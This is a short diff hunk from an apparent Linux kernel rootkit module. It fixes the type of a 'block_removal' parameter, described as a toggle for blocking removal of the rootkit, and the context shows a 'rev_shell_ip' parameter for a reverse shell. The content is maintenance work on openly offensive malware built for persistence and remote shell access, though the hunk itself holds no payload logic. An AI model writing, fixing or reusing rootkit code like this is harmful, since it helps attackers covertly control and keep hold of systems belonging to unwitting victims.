@@ -57,8 +57,8 @@ struct commands cmds;
  * intermittently and do things when it changes.
  **/
 
-static bool *block_removal = false;
-module_param(block_removal, charp, 0770);
+static bool block_removal = false;
+module_param(block_removal, bool, 0770);
 MODULE_PARM_DESC(block_removal, "Toggle for blocking removal of rootkit.");
 static char *rev_shell_ip = NULL;
 module_param(rev_shell_ip, charp, 0770);
